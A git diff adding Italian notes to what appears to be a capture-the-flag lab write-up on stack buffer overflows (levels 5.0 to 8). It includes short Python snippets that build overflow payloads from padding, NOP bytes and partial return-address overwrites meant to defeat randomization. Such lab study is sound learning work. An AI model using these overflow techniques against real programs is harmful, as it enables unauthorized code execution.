@@ -117,6 +117,10 @@ Questo ci permette di capire che il return address sarà 8 byte dopo il primo se
     f.write(b'\xc8\x1c\x40')
     ```
 
+## Livello 5.0
+
++ Questo livello richiede di rompere ancora di più il controllo sulla lunghezza del buffer, facendogli fare una moltiplicazione tra numeri negativi, ma non sono riuscito ad andare avanti ricevendo sempre l'errore di bad address
+
 ## Livello 6.0
 
 + Al livello 6 il segmentation scatta con 7 byte rimasti, quindi non al primo della riga ma al secondo byte della riga
@@ -140,3 +144,30 @@ Questo ci permette di capire che il return address sarà 8 byte dopo il primo se
     f.write(b'\x90'*8)
     f.write(b'\xba\x14\x40')
     ```
+
+## Livello 7.0
+
++ Questo livello è come il sesto, ma richiede di essere runnato più volte perchè la posizione cambia ad ogni iterazione, ma solo per il quarto byte (gli altri 3 rimangono uguali).  
+Nell'esempio sotto *d04 sono i 3 byte che non cambiano mai, mentre il quarto, in questo caso 1, può cambiare in 16 valori diversi ovviamente
+
+    ```py
+    with open("input.bin", "wb") as f:
+    f.write(b'100')
+    f.write(b'\x56'*65)     #metterne sempre uno in più
+    f.write(b'\x90'*8)
+    f.write(b'\x04\x1d')    #1d04
+    ```
+
+## Livello 7.1
+
++ Livello al buio, devo cercare il segmentation a caso e poi objdump per 3 bit su 4.
+
+    ```py
+    with open("input.bin", "wb") as f:
+    f.write(b'100')
+    f.write(b'\x56'*65)     #metterne sempre uno in più
+    f.write(b'\x90'*8)
+    f.write(b'\x04\x1d')    #1d04
+    ```
+
+## Livello 8
